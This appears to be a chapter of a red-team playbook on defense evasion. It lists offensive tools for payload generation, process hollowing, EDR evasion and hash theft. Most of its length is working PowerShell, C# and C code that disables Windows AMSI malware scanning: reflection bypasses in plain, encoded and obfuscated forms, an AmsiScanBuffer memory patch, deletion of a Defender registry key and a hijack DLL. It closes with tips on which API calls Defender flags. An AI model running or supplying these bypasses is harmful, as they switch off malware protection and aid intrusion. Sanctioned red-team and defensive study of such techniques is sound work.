# 5 Installation

| Name | Description | URL |
| --- | --- | --- |
| ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
| EXE_to_DLL | Converts a EXE into DLL | https://github.com/hasherezade/exe_to_dll |
| Veil | Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. | https://github.com/Veil-Framework/Veil |
| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/optiv/ScareCrow |
| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
| NimHollow | Nim implementation of Process Hollowing using syscalls (PoC) | https://github.com/snovvcrash/NimHollow |
| SysWhispers | SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls. | https://github.com/m57/SysWhispers |
| NimlineWhisperer2 | A tool for converting SysWhispers2 syscalls for use with Nim projects | https://github.com/ajpc500/NimlineWhispers2 |
| OffensiveNim | Experiments in weaponizing Nim for implant development and general offensive operations. | https://github.com/0xsyr0/OffensiveNim |
| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
| PSByPassCLM | Bypass for PowerShell Constrained Language Mode | https://github.com/padovah4ck/PSByPassCLM |
| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
| mimikatz Obfuscator | This script downloads and slightly "obfuscates" the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
| AmsiHook | AmsiHook is a project I created to figure out a bypass to AMSI via function hooking. | https://github.com/tomcarver16/AmsiHook |
| AMSITrigger v3 | The Hunt for Malicious Strings | https://github.com/RythmStick/AMSITrigger |
| DefenderCheck | Identifies the bytes that Microsoft Defender flags on. | https://github.com/matterpreter/DefenderCheck |
| AMSI.fail | AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. | http://amsi.fail |
| AmsiScanBufferBypass | Bypass AMSI by patching AmsiScanBuffer | https://github.com/rasta-mouse/AmsiScanBufferBypass |
| AMSI Bypass Powershell | This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts. | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |

## AMSI Bypass

### PowerShell Downgrade

```c
PS C:\> powershell -version 2
```

### Fabian Mosch / Matt Graeber Bypass

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Base64 Encoded

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Hooking

> [Simple Injetor](https://github.com/tomcarver16/SimpleInjector)

> [AmsiHook](https://github.com/tomcarver16/AmsiHook)

```c
PS C:\> .\SimpleInjector.exe powershell.exe .\AMSIHook.dll
```

### Memory Patching

> [AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)

The patch return always `AMSI_RESULT_CLEAN` and shows the following line.

```c
static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```

#### Load and Execute the DLL

```c
[System.Reflection.Assembly]::LoadFile("C:\Users\pentestlab\ASBBypass.dll")
[Amsi]::Bypass()
```

The tool `AMSITrigger v3` can be used to discover the strings which are making calls to the `AmsiScanBuffer`.

> [AMSITrigger v3](https://github.com/RythmStick/AMSITrigger)

```c
PS C:\> .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
```

Obfuscating the contained code within the script will evade `AMSI`.

```c
${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${_/==\_/\__/===\_/}
${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${/==\_/=\/\__/\/\/} = 0
[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
```

### Forcing an Error

Forcing `AMSI` to fail (amsiInitFailed) will result that no scan will be initiated for the current process.

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Avoiding the use of strings with the usage of variables can also evade `AMSI`.

```c
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

Forcing an error in order to send the flag in a legitimate way is another option. This bypass allocates a memory region for the `amsiContext` and since the `amsiSession` is set to null it will result an error.

```c
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
```

An obfuscated version of this bypass can be found on [AMSI.fail](https://amsi.fail/).

```c
$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
```

### Registry Key Modification

`GUID` for Windows Defender.

```c
KLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

The key can be removed to stop the `AMSI provider` to perform `AMSI inspection` and evade the control.
Notice that this requires elevated rights.

```c
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

### DLL Hijacking

Requirement is to create a non-legitimate `amsi.dll` and place it in the same folder as the `64 Bit` version of `PowerShell`. The `PowerShell` executable also can be copied into a writeable directory.

```c
#include "pch.h"
#include "iostream"

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        LPCWSTR appName = NULL;
        typedef struct HAMSICONTEXT {
            DWORD       Signature;            // "AMSI" or 0x49534D41
            PWCHAR      AppName;           // set by AmsiInitialize
            DWORD       Antimalware;       // set by AmsiInitialize
            DWORD       SessionCount;      // increased by AmsiOpenSession
        } HAMSICONTEXT;
        typedef enum AMSI_RESULT {
            AMSI_RESULT_CLEAN,
            AMSI_RESULT_NOT_DETECTED,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END,
            AMSI_RESULT_DETECTED
        } AMSI_RESULT;

        typedef struct HAMSISESSION {
            DWORD test;
        } HAMSISESSION;

        typedef struct r {
            DWORD r;
        };

        void AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext);
        void AmsiOpenSession(HAMSICONTEXT amsiContext, HAMSISESSION * amsiSession);
        void AmsiCloseSession(HAMSICONTEXT amsiContext, HAMSISESSION amsiSession);
        void AmsiResultIsMalware(r);
        void AmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiScanString(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT * result);
        void AmsiUninitialize(HAMSICONTEXT amsiContext);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```c
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

> Source: https://pentestlaboratories.com/tag/obfuscation/

## Windows Defender

Windows Defender seems like to have issues with the following function in Visual Basic Scripts.

```c
Private Declare PtrSafe Function VirtualProtectEx Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flNewProtect As Long, _
    ByRef lpflOldProtect As LongPtr _
) As Long
```

Also with:

- CreateProcess
- VirtualAllocEx
- GetProcAddress
- LoadLibrary

### Previous

- [4 Exploitation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4-Exploitation.md)
- [4.1 Defense Evasion](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.1-Defense-Evasion.md)
- [4.2 Credential Dumping](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.2-Credential-Dumping.md)
- [4.3 Privilege Escalation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.3-Privilege-Escalation.md)
- [4.4 Lateral Movement](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/4-Exploitation/4.4-Lateral-Movement.md)

### Next

- [5.1 Persistence](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md)
- [5.2 Situational Awareness](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.2-Situational-Awareness.md)
